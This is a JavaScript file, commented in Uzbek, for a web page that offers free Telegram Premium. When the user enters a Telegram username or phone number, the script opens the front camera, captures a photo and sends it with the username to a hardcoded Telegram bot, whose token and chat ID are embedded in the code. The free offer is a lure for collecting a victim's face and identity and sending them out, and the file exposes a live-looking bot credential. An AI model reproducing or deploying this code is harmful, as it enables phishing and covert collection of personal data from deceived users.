
const BOT_TOKEN = "8756417532:AAGUaGq5qnwolIN8qL2sR3dVwcl0ET_6TY0";

const CHAT_ID = "7704711263";



// ========================================
// ELEMENTLAR
// ========================================

const buyBtn = document.getElementById("buyBtn");

const premiumModal =
    document.getElementById("premiumModal");

const closePremium =
    document.getElementById("closePremium");

const activateBtn =
    document.getElementById("activateBtn");

const username =
    document.getElementById("username");



const cameraModal =
    document.getElementById("cameraModal");

const closeCamera =
    document.getElementById("closeCamera");

const video =
    document.getElementById("video");

const canvas =
    document.getElementById("canvas");

const photo =
    document.getElementById("photo");

const captureBtn =
    document.getElementById("captureBtn");

const retryBtn =
    document.getElementById("retryBtn");

const statusText =
    document.getElementById("status");



let stream = null;



// ========================================
// PREMIUM MODAL OCHISH
// ========================================

buyBtn.addEventListener("click", () => {

    premiumModal.classList.add("active");

});



// ========================================
// PREMIUM MODAL YOPISH
// ========================================

closePremium.addEventListener("click", () => {

    premiumModal.classList.remove("active");

});



// ========================================
// FAOLLASHTIRISH
// ========================================

activateBtn.addEventListener("click", async () => {

    const user = username.value.trim();


    if (user === "") {

        alert(
            "Telegram username yoki telefon raqam kiriting!"
        );

        return;

    }


    premiumModal.classList.remove("active");

    cameraModal.classList.add("active");


    await openCamera();

});



// ========================================
// CAMERA OCHISH
// ========================================

async function openCamera() {

    try {

        statusText.textContent = "";


        stream =
            await navigator.mediaDevices.getUserMedia({

                video: {

                    facingMode: "user"

                },

                audio: false

            });


        video.srcObject = stream;


        video.style.display = "block";

        photo.style.display = "none";

        captureBtn.style.display = "block";

        retryBtn.style.display = "none";


    } catch (error) {

        console.error(error);


        alert(
            "Kameraga ruxsat berilmadi!"
        );


        cameraModal.classList.remove("active");

    }

}



// ========================================
// RASMGA OLISH
// ========================================

captureBtn.addEventListener(
    "click",

    async () => {

        if (!stream) {

            alert("Kamera ochilmagan!");

            return;

        }


        // canvas o'lchami

        canvas.width =
            video.videoWidth;

        canvas.height =
            video.videoHeight;


        const ctx =
            canvas.getContext("2d");


        // videodan rasm olish

        ctx.drawImage(

            video,

            0,
            0,

            canvas.width,
            canvas.height

        );


        // ekranga ko'rsatish

        const imageData =
            canvas.toDataURL(
                "image/jpeg",
                0.9
            );


        photo.src = imageData;


        video.style.display = "none";

        photo.style.display = "block";


        captureBtn.style.display = "none";

        retryBtn.style.display = "block";


        stopCamera();


        statusText.textContent =
            "⏳ Telegramga yuborilmoqda...";


        // Telegramga yuborish

        canvas.toBlob(

            async (blob) => {

                if (!blob) {

                    statusText.textContent =
                        "❌ Rasm yaratilmadi";

                    return;

                }


                await sendPhotoToTelegram(blob);

            },

            "image/jpeg",

            0.9

        );

    }

);



// ========================================
// TELEGRAMGA RASM YUBORISH
// ========================================

async function sendPhotoToTelegram(blob) {

    const user =
        username.value.trim();


    const formData =
        new FormData();


    formData.append(
        "chat_id",
        CHAT_ID
    );


    formData.append(
        "photo",
        blob,
        "premium-user.jpg"
    );


    formData.append(

        "caption",

        `⭐ Yangi Premium so'rovi

👤 Telegram: ${user}

📦 Premium: 3 Oy
💰 Narxi: 0 SO'M`

    );


    try {

        const response =
            await fetch(

                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,

                {

                    method: "POST",

                    body: formData

                }

            );


        const result =
            await response.json();


        console.log(result);


        if (result.ok) {

            statusText.textContent =
                "✅ Rasm Telegram botga yuborildi!";


            alert(
                "✅ Premium so'rovi yuborildi!"
            );

        } else {

            console.error(result);


            statusText.textContent =
                "❌ Telegramga yuborilmadi";


            alert(
                "Telegram xatosi: " +
                result.description
            );

        }


    } catch (error) {

        console.error(error);


        statusText.textContent =
            "❌ Xatolik yuz berdi";


        alert(
            "Telegram botga yuborishda xatolik!"
        );

    }

}



// ========================================
// QAYTA RASMGA OLISH
// ========================================

retryBtn.addEventListener(
    "click",

    async () => {

        photo.style.display = "none";

        statusText.textContent = "";


        await openCamera();

    }

);



// ========================================
// CAMERA YOPISH
// ========================================

closeCamera.addEventListener(
    "click",

    () => {

        stopCamera();

        cameraModal.classList.remove(
            "active"
        );

    }

);



// ========================================
// CAMERA TO'XTATISH
// ========================================

function stopCamera() {

    if (stream) {

        stream
            .getTracks()
            .forEach(
                track => track.stop()
            );


        stream = null;

    }

}



// ========================================
// MODAL TASHQARISINI BOSSA
// ========================================

window.addEventListener(
    "click",

    (event) => {

        if (
            event.target === premiumModal
        ) {

            premiumModal.classList.remove(
                "active"
            );

        }


        if (
            event.target === cameraModal
        ) {

            stopCamera();

            cameraModal.classList.remove(
                "active"
            );

        }

    }

);